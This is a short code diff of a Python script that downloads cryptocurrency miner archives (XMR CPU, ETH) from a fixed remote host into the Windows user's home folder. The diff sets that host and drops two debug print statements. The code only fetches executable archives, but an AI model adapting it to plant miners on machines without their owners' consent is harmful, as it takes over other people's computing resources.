@@ -2,12 +2,11 @@ from os import chdir, getlogin
 from platform import system as os
 import urllib.request
 
-url = "http://127.0.0.1/" #Enter your HTTP Server here, soon
+url = "http://synnek1337.github.io/"
 
 
 def download(coin, method):
     if os() == "Windows":
-        print("OS is Windows")
         chdir(r'C:\Users\%s' % getlogin())
         if coin == "XMR" and method == "CPU":
             fname = "xmrcpuwin.zip"
@@ -29,7 +28,6 @@ def download(coin, method):
 
         elif coin == "ETH":
             fname = "ethwin.zip"
-        print(coin)
     elif os() == "Darwin":
         pass
 
